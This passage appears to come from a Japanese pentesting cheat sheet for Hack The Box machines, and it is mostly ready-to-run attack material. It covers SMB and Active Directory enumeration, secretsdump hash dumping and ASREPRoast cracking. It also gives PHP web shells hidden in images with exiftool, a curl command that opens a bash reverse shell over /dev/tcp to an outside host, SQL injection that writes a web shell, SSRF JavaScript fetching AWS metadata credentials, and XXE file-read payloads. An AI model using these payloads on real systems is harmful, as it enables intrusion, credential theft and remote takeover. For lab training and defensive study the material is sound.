<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># enum4linux</span>
enum4linux targethost.htb
<span class="token operator">&lt;</span><span class="token operator">!</span>-- 
    -U  get userlist
    -M  get machine list
    -N  get namelist dump <span class="token punctuation">(</span>different from -U and-M<span class="token punctuation">)</span>
    -S  get sharelist
    -P  get password policy information
    -G  get group and member list
    -A  all of the above <span class="token punctuation">(</span>full basic enumeration<span class="token punctuation">)</span> --<span class="token operator">></span>
    
<span class="token comment"># SMBの探索</span>
crackmapexec smb targethost.htb
crackmapexec smb targethost.htb -u user-p <span class="token string">'password'</span>

<span class="token comment"># AD環境 (SMB共有の列挙)</span>
smbmap -H targethost.htb -d Domain -u user -p pass
smbclient -L //targethost.domain/ -U user</code></pre></div>
<ul>
<li>ポート139と445が開いている場合はSMBが実行されている可能性が高い。</li>
<li>ワークグループ名、サーバーがnullセッションを許可するかどうか。システムに存在するユーザーに関する情報を取得できる。</li>
<li>print <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>、</mtext><mi>I</mi><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">、IPC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span></span></span></span>、ADMIN $などのデフォルトの共有だけでなく、 optやtmpなどのカスタム共有の情報も取得できる。</li>
<li>パスワードポリシー、資格情報が取得できる。</li>
</ul>
<p>参考：<a href="https://www.kali.org/tools/enum4linux/" target="_blank" rel="nofollow noopener noreferrer">enum4linux | Kali Linux Tools</a></p>
<p>参考：<a href="https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/" target="_blank" rel="nofollow noopener noreferrer">Enum4linuxとSmbclientを使用してSMBを列挙する方法«ヌルバイト::WonderHowTo</a></p>
<p>参考：<a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="nofollow noopener noreferrer">byt3bl33d3r/CrackMapExec: A swiss army knife for pentesting networks</a></p>
<p>参考：<a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="nofollow noopener noreferrer">ShawnDEvans/smbmap: SMBMap is a handy SMB enumeration tool</a></p>
<h3 id="active-directory環境のスキャン" style="position:relative;"><a href="#active-directory%E7%92%B0%E5%A2%83%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="active directory環境のスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Active Directory環境のスキャン</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># DomainNameをhostsに追加しておく(enum4linux や Nmap でドメインが特定されている状態で使用)</span>
./kerbrute_linux_386 userenum -t <span class="token number">20</span> -d domain.local --dc domain.local /usr/share/wordlists/metasploit/unix_users.txt

<span class="token comment"># impacketのexamples/secretsdump.py(DRSUAPI)によるダンプの取得</span>
python3 examples/secretsdump.py DOMAIN/backup:PASS@10.10.10.0
<span class="token comment"># [*] Using the DRSUAPI method to get NTDS.DIT secrets</span>
<span class="token comment"># Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span>

<span class="token comment"># impacketのexamples/GetNPUsers.pyによるASREPRoast攻撃</span>
python3 examples/GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

<span class="token comment"># GetNPUsers.pyの出力はハッシュで返されるので、以下のHashcatで解析できる</span>
hashcat -a <span class="token number">0</span> -m <span class="token number">18200</span> ./hash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>
<ul>
<li>Kerberosの事前認証を悪用することにより、有効なActiveDirectoryユーザーをブルートフォースおよび列挙することができる。</li>
<li>ドメインコントローラーのバックアップアカウント(buckup)などの権限を取得した場合、DC内のすべてのアカウントのパスワードハッシュを取得できる可能性がある。</li>
<li>Ntds.ditファイル（ActiveDirectoryデータを格納するデータベース）を取得できた場合は、mimikatzやHashcatでパスワードを復号できる可能性がある。(DRSUAPIでダンプを取得)</li>
<li>ASREPRoast は、Kerberos事前認証が必要な属性(DONT<em>REQ</em>PREAUTH)を持たないユーザを探し、悪用する攻撃。</li>
</ul>
<p>参考：<a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties" target="_blank" rel="nofollow noopener noreferrer">UserAccountControl property flags - Windows Server | Microsoft Docs</a></p>
<p>参考：<a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast" target="_blank" rel="nofollow noopener noreferrer">ASREPRoast - HackTricks</a></p>
<h3 id="web脆弱性スキャン" style="position:relative;"><a href="#web%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="web脆弱性スキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Web脆弱性スキャン</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># nikto</span>
nikto --url targethost.htb <span class="token operator">|</span> <span class="token function">tee</span> nikto.txt

<span class="token comment"># OWASP ZAP</span>
<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zaproxy -y

<span class="token comment"># SQL injection scan</span>
python3 sqlmap.py -u <span class="token string">"http://targethost.htb/"</span> --data <span class="token string">"username=test&amp;country=Ukraine"</span>

<span class="token comment"># WPScan</span>
wpscan --url http://targethost.htb --enumerate u,cb,m,vp <span class="token operator">|</span> <span class="token function">tee</span> wpscan.txt</code></pre></div>
<p>参考：<a href="https://github.com/sullo/nikto" target="_blank" rel="nofollow noopener noreferrer">sullo/nikto: Nikto web server scanner</a></p>
<p>参考：<a href="https://www.zaproxy.org/getting-started/" target="_blank" rel="nofollow noopener noreferrer">OWASP ZAP – Getting Started</a></p>
<p>参考：<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="nofollow noopener noreferrer">sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool</a></p>
<p>参考：<a href="/hackthebox-linux-validation#second-order-sql-injection">Second Order SQL injection / UNION injection</a></p>
<p>参考：<a href="https://qiita.com/koujimatsuda11/items/d49e8642dea1a1b0d067" target="_blank" rel="nofollow noopener noreferrer">WPScanを使ってWordpressをスキャンする - Qiita</a></p>
<h2 id="webエクスプロイトまとめ" style="position:relative;"><a href="#web%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%BE%E3%81%A8%E3%82%81" aria-label="webエクスプロイトまとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Webエクスプロイトまとめ</h2>
<h3 id="web-shellを使う" style="position:relative;"><a href="#web-shell%E3%82%92%E4%BD%BF%E3%81%86" aria-label="web shellを使う permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Web Shellを使う</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># PHPを埋め込める場合</span>
<span class="token operator">&lt;</span>?php SYSTEM<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>

<span class="token comment"># exiftoolで埋め込む場合</span>
exiftool -documentname<span class="token operator">=</span><span class="token string">'&lt;?php system($_GET['</span>cmd<span class="token string">']); ?>'</span> test.jpg
<span class="token function">mv</span> test.jpg test.php.jpg

<span class="token comment"># Shellを呼び出す</span>
<span class="token function">curl</span> -G --data-urlencode <span class="token string">"cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.10.2/4444 0&lt;&amp;1 2>&amp;1'"</span> http://target.htb/test.php.jpg <span class="token operator">|</span> <span class="token function">cat</span></code></pre></div>
<p>参考：<a href="/hackthebox-linux-networked#exiftool%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%ABphp%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80">File Upload Filter Bypass: exiftoolを使って画像ファイルにphpスクリプトを埋め込む</a></p>
<h3 id="sql-injection" style="position:relative;"><a href="#sql-injection" aria-label="sql injection permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SQL injection</h3>
<div class="gatsby-highlight" data-language="sql"><pre class="language-sql"><code class="language-sql"><span class="token comment">-- SQL injection scan</span>
<span class="token comment">-- python3 sqlmap.py -u "http://targethost.htb/" --data "username=test&amp;country=Ukraine"</span>

<span class="token comment">-- DBのユーザ名を表示</span>
<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">-- DB名</span>
<span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">-- DS列挙</span>
<span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata

<span class="token comment">-- テーブル取得</span>
<span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token string">'&lt;table name>'</span>

<span class="token comment">-- テーブル情報取得</span>
<span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name <span class="token operator">=</span> <span class="token string">'&lt;table name>'</span>

<span class="token comment">-- テーブル情報特定(複文)</span>
<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span>tablename<span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">FROM</span> pg_tables <span class="token keyword">WHERE</span> tablename <span class="token operator">LIKE</span> <span class="token string">'%ar%'</span><span class="token comment">--</span>
<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span>tablename<span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">FROM</span> pg_tables <span class="token keyword">LIMIT</span> <span class="token number">1</span> <span class="token keyword">OFFSET</span> <span class="token number">6</span><span class="token punctuation">;</span><span class="token comment">--</span>

<span class="token comment">-- カラム特定（複文）</span>
<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span>column_name<span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">'news_subscriber'</span> <span class="token operator">AND</span> column_name <span class="token operator">LIKE</span> <span class="token string">'%ex%'</span>　<span class="token comment">--</span>
<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token boolean">null</span><span class="token punctuation">,</span>column_name<span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span> <span class="token keyword">OFFSET</span> <span class="token number">6</span><span class="token punctuation">;</span><span class="token comment">--</span>

<span class="token comment">-- ユーザの権限参照</span>
<span class="token keyword">select</span> privilege_type <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges <span class="token keyword">where</span> grantee <span class="token operator">=</span> <span class="token string">"&lt;username>"</span>

<span class="token comment">-- ファイルへの書き込み（ユーザにFILE権限が存在する場合のみ実行可能）</span>
<span class="token keyword">select</span> <span class="token string">"Test"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/Test.txt'</span>

<span class="token comment">-- WEBシェルの書き込み</span>
<span class="token keyword">select</span> <span class="token string">"&lt;?php SYSTEM($_REQUEST['cmd']); ?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/webshell.php'</span>

<span class="token comment">-- UNION injection の動作確認(コメントアウト後に必ずクローズを入れること)</span>
<span class="token string">' UNION SELECT 1;-- -'</span><span class="token punctuation">;</span>

<span class="token comment">-- DBのユーザ名を表示（UNION Injection）</span>
<span class="token string">' union select user();-- -'</span><span class="token punctuation">;</span></code></pre></div>
<ul>
<li>
<p>入力フォームからのinputにSQLiの脆弱性が見つからない場合でも、<code class="language-text">Second Order SQL injection</code>やマルチバイト文字を利用した攻撃方法が存在する可能性がある。</p>
<ul>
<li><a href="https://atmarkit.itmedia.co.jp/ait/articles/0611/02/news127.html" target="_blank" rel="nofollow noopener noreferrer">今夜分かるSQLインジェクション対策：Security&#x26;Trust ウォッチ（42） - ＠IT</a></li>
</ul>
</li>
</ul>
<p>参考：<a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections" target="_blank" rel="nofollow noopener noreferrer">SQL Injection Cheat Sheet</a></p>
<p>参考：<a href="https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course" target="_blank" rel="nofollow noopener noreferrer">PentesterLab: Learn Web App Pentesting!</a></p>
<h3 id="xss" style="position:relative;"><a href="#xss" aria-label="xss permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>XSS</h3>
<p><code class="language-text">AWS meta-data</code>攻撃のサンプル</p>
<div class="gatsby-highlight" data-language="javascript"><pre class="language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> XMLHttpRequest<span class="token punctuation">.</span><span class="token constant">DONE</span> <span class="token operator">&amp;&amp;</span> xmlhttp<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"got resp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundImage<span class="token operator">=</span><span class="token string">'none'</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> main <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        main<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/fetch"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"http://169.254.169.254/latest/meta-data/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/fetch"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"http://169.254.169.254/latest/meta-data/hostname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/fetch"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p><code class="language-text">Local file injection</code>攻撃のサンプル</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">var xmlhttp <span class="token operator">=</span> new XMLHttpRequest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	xmlhttp.onreadystatechange <span class="token operator">=</span> <span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp.readyState <span class="token operator">==</span> XMLHttpRequest.DONE <span class="token operator">&amp;&amp;</span> xmlhttp.status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        var output <span class="token operator">=</span> document.getElementById<span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span>
        output.style.visibility <span class="token operator">=</span> <span class="token string">"visible"</span><span class="token punctuation">;</span>
        var resp <span class="token operator">=</span> JSON.parse<span class="token punctuation">(</span>xmlhttp.responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
        document.getElementById<span class="token punctuation">(</span><span class="token string">"collapsible"</span><span class="token punctuation">)</span>.checked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        document.getElementById<span class="token punctuation">(</span><span class="token string">"ver"</span><span class="token punctuation">)</span>.innerHTML <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">'http_ver'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        document.getElementById<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>.innerHTML <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        document.getElementById<span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">)</span>.innerHTML <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">'server'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        document.getElementById<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span>.innerHTML <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        document.getElementById<span class="token punctuation">(</span><span class="token string">"httpresponse"</span><span class="token punctuation">)</span>.innerHTML <span class="token operator">=</span> escape<span class="token punctuation">(</span>resp<span class="token punctuation">[</span><span class="token string">'raw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
xmlhttp.open<span class="token punctuation">(</span><span class="token string">"POST"</span>, <span class="token string">"/scan"</span>, <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp.send<span class="token punctuation">(</span><span class="token string">"file:///etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xmlhttp.send<span class="token punctuation">(</span><span class="token string">"file:///home/min/user.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<h3 id="xml-external-entityxml外部実体参照" style="position:relative;"><a href="#xml-external-entityxml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7" aria-label="xml external entityxml外部実体参照 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>XML External Entity(XML外部実体参照)</h3>
<p>XXEを悪用することで、サーバ内のファイルの取得や情報収集、SSRF攻撃など様々な攻撃に利用できる。</p>
<p><code class="language-text">&lt;!ENTITY</code>を用いることで実体参照を呼び出すことができ、文字列の置換や、外部ファイルの内容を埋め込む。</p>
<p>そのため、XMLを送り込むことができる場合には、XXEを試すとよい。</p>
<div class="gatsby-highlight" data-language="xml"><pre class="language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
   &lt;!ENTITY xxe SYSTEM "file://etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>

   # PHPの場合 
   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span> &lt;<span class="token name">!ENTITY</span> <span class="token name">xxe</span> <span class="token name">SYSTEM</span> <span class="token string">"php://filter/convert.base64-encode/resource=/etc/passwd"</span>><span class="token punctuation">]</span> <span class="token punctuation">></span></span>
   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span> &lt;<span class="token name">!ENTITY</span> <span class="token name">xxe</span> <span class="token name">SYSTEM</span> <span class="token string">"php://filter/convert.base64-encode/resource=db.php"</span>><span class="token punctuation">]</span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre></div>
<p>参考：<a href="/hackthebox-linux-bugbountyhunter#xxexml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7">XXE(XML外部実体参照)</a></p>
<h2 id="その他のエクスプロイト" style="position:relative;"><a href="#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88" aria-label="その他のエクスプロイト permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>その他のエクスプロイト</h2>
